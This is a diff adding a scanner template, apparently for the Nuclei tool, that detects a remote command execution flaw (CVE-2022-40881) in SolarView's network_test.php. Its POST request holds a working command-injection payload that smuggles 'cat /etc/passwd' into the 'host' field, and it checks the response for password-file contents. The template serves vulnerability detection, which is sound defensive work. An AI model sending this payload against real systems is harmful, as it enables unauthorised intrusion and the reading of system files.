@@ -1,0 +1,41 @@
+id: cve-2022-40881
+
+info:
+  name: SolarView network_test.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,CVE-2022-40881
+  description: |
+    SolarView network_test.php is vulnerable to remote command execution (CVE-2022-40881).
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/network_test.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/cgi-bin/p1_network_ip.cgi"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/network_test.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "host=%0acat${IFS}/etc/passwd%0a&command=ping"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+          - "<PRE>"
+        part: body
